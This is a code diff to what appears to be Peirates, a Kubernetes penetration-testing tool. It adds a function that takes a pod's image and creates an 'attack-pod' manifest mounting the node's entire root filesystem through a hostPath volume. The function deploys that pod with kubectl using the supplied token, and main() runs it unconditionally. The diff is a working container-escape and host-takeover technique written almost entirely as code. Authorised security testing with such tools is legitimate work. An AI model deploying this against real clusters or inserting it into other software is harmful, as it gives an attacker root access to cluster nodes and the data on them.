@@ -19,6 +19,8 @@ import (
 	"os/exec"
 	"regexp"
 	"strings"
+	"math/rand" // Random module for creating random string building
+	"time" // Time modules
 
 	// Packages belonging to Peirates go here
 	"gitlab.inguardians.com/agents/peirates/config"
@@ -168,6 +170,113 @@ func requestme(connectionString config.ServerInfo, location string) {
 	println(string(contents))
 }
 
+
+//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+// Added mountFS code to create yaml file drop to disk and create a pod.    |
+//--------------------------------------------------------------------------| 
+
+func init() {
+	rand.Seed(time.Now().UnixNano())
+}
+
+//var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
+
+func randSeq(n int) string {
+	letters := []rune("abcdefghijklmnopqrstuvwxyz")
+	b := make([]rune, n)
+	for i := range b {
+		b[i] = letters[rand.Intn(len(letters))]
+	}
+	return string(b)
+}
+
+type Mount_Info struct {
+	yaml_build  string
+	image string
+	namespace string
+}
+
+func Mount_RootFS(all_pods_listme []string, connectionString config.ServerInfo){
+	var Mount_InfoVars = Mount_Info{}
+	fmt.Println("This is the output: ", string(all_pods_listme[1]))
+	//Get pods
+//# Get the first pod from all_pod_listme
+//pod_to_examine = all_pod_listme[0]
+
+//# Run a kubectl command to get YAML
+//yaml_output = kubectl -n ...  --token .... --ca ... get pod $pod_to_examine -o yaml
+
+//# Parse yaml output to get the image name
+//image_name = `grep "- image" yaml_output | awk '{print $3}'`
+
+	get_images_raw, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "get", "pods", all_pods_listme[0], "-o", "yaml",).Output()
+
+	get_image_lines := strings.Split(string(get_images_raw), "\n")
+
+	for _, line := range get_image_lines {
+		matched, err := regexp.MatchString(`^\s*- image`, line)
+		if err != nil {
+			log.Fatal(err)
+		}
+		if matched {
+			//added checking to only enumerate running pods
+			Mount_InfoVars.image = strings.Fields(line)[2]
+		}
+	}
+
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	//creat random  string
+	random_string :=randSeq(1)
+
+	// Create Yaml File
+	Mount_InfoVars.yaml_build = fmt.Sprintf(`apiVersion: v1
+kind: Pod
+metadata:
+  annotations:
+  labels:
+  name: attack-pod-%s
+  namespace: %s
+spec:
+  containers:
+  - image: %s
+    imagePullPolicy: IfNotPresent
+    name: attack-container
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+       path: /
+`, random_string, connectionString.Namespace, Mount_InfoVars.image)
+
+// Write yaml file out to current directory
+	ioutil.WriteFile("attack-pod.yaml", []byte(Mount_InfoVars.yaml_build), 0700)
+
+	_, err = exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "apply", "-f","attack-pod.yaml").Output()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	//out, err = exec.Command("").Output()
+	//if err != nil {
+	//	fmt.Println("Token location error: ", err)
+	//}
+	//fmt.Println(out)
+}
+
+
+//------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
 func main() {
 
 	// Create a global variable named "connectionString" initialized to
@@ -197,6 +306,9 @@ func main() {
 	} else {
 		println(" This token cannot create pods on the cluster")
 	}
+
+	Mount_RootFS(all_pods, connectionString)
+
 	// This part is direct conversion from the python
 	// Note that we use println() instead of print().
 	// In go, print() does not add a newline while
@@ -230,3 +342,4 @@ https://10.23.58.40:6443/version
 https://10.23.58.40:6443/apis/apps/v1/proxy (500)
 https://10.23.58.40:6443/apis/apps/v1/watch (500)
 */
+
